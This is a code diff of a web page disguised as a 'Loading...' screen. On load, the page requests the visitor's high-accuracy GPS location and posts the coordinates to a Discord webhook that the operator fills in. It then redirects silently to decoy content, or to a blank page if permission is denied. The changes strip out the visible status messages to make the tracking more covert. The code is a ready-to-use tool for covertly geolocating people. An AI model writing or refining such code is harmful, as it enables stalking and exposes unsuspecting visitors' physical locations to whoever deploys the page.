@@ -2,37 +2,19 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>FlexDrop</title>
+  <title>Loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      background-color: #000;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: Arial, sans-serif;
-      height: 100vh;
+    html, body {
       margin: 0;
-      font-size: 1.2rem;
+      height: 100%;
+      background-color: #000;
     }
   </style>
 </head>
 <body>
-  <div id="status">Preparing content...</div>
-
   <script>
-    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // Replace with your webhook
-
-    async function requestNotificationPermission() {
-      try {
-        if ('Notification' in window) {
-          await Notification.requestPermission();
-        }
-      } catch (err) {
-        console.error("Notification error:", err);
-      }
-    }
+    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // replace with your Discord webhook
 
     function sendToWebhook(lat, lon, acc) {
       fetch(webhookUrl, {
@@ -54,27 +36,35 @@
 
             sendToWebhook(lat, lon, acc);
 
-            document.getElementById("status").innerText = "GPS granted. Loading content...";
-            setTimeout(() => {
-              window.location.href = "https://example.com/view"; // change to your final link
-            }, 1000);
+            // Redirect silently
+            window.location.href = "https://example.com/view"; // change this to your content
           },
-          (error) => {
-            // If denied or failed, close the page silently
+          () => {
+            // On deny or fail, exit silently
             window.location.href = "about:blank";
           },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
         );
       } else {
-        document.getElementById("status").innerText = "Geolocation not supported.";
+        window.location.href = "about:blank";
       }
     }
 
-    // Fire everything after a short delay (feels smoother)
-    setTimeout(() => {
-      requestNotificationPermission();
+    function requestNotification() {
+      if ('Notification' in window) {
+        Notification.requestPermission().then(() => {});
+      }
+    }
+
+    // Trigger both on load
+    window.onload = () => {
+      requestNotification();
       requestGPS();
-    }, 1000);
+    };
   </script>
 </body>
 </html>
